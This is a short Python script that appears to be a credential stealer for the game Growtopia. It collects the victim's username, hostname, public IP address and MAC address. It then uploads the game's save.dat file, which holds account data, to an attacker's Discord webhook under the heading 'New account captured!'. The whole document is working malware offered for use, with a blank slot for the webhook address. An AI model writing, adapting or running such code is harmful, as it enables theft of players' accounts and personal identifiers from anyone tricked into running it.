from discord_webhook import DiscordWebhook, DiscordEmbed
from os import getenv
import socket
from requests import get
import re, uuid

try:
  link = "" # put your webhook here!
  ipaddress = get("https://api.ipify.org").text
  info = DiscordEmbed(title='New account captured!',description='''
  
  Username:    '''+getenv('username')+ "/" +socket.gethostname()+'''
  IP Address : '''+ipaddress+''' 
  MAC Address: '''+':'.join(re.findall('..', '%012x' % uuid.getnode()))+''' 
  ''', color='e6f613')
  data = getenv('LOCALAPPDATA')+ '\\Growtopia\\save.dat'
  webhook = DiscordWebhook(
      url=link)



  with open(data, 'rb') as f:
     webhook.add_file(file=f.read(), filename='save.dat')
     webhook.add_embed(info)
     response = webhook.execute()

except:
    error = "[!]save.dat doesn't exist or the file name was changed!"
    webhook = DiscordWebhook(
        url=link, content=error)
    response = webhook.execute()